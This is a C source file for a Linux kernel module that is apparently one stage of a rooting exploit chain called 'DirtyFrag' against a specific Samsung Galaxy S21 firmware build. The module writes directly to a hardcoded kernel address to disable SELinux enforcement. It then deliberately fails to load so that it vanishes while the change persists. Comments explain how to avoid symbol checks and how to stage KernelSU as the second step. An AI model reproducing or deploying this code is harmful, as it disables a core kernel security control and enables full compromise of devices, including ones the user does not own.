/* df_stager: minimal SELinux-permissive stager for SM-G991B/HZC2 (5.4.242).
 *
 * Role in the DirtyFrag chain (cf. DFRoot): loaded via finit_module from
 * a uid-0 context (vendor_modprobe) AFTER page-cache writes; clears
 * selinux_state.enforcing, then unloads itself via -E2BIG (write persists).
 * The KernelSU .ko + ksud (already staged) are the SECOND stage.
 *
 * Deliberately import-free (besides module_layout): the selinux_state
 * address is hardcoded (HZC2 vmlinux: 0xffffffc011f69518, KASLR slide=0
 * on this device), so no kallsyms/sprint_symbol dependency and NO symbol
 * CRC exposure - insmod needs only a matching vermagic string.
 *
 * Build (configured HZC2 tree at $KDIR, clang-11):
 *   make -C dfmod KDIR=/path/to/kernel-G991BXXSJHZC2
 * Verify: modinfo df_stager.ko | grep vermagic
 *   (expect 5.4.242-30958140-abG991BXXSJHZC2 SMP preempt mod_unload modversions aarch64)
 */
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/types.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("IonStack_S21");
MODULE_DESCRIPTION("DirtyFrag SELinux permissive stager (HZC2)");

/* HZC2 vmlinux: selinux_state @ 0xffffffc011f69518, enforcing is field 0 */
#define SELINUX_STATE_ADDR 0xffffffc011f69518UL

static int __init dfstager_init(void)
{
	volatile unsigned char *enforcing =
		(volatile unsigned char *)SELINUX_STATE_ADDR;

	*enforcing = 0;
	__asm__ volatile("dsb sy" ::: "memory");
	/* Unload trick: the write persists, the module goes away. */
	return -E2BIG;
}

/* No module_exit: we never unload cleanly. */
module_init(dfstager_init);
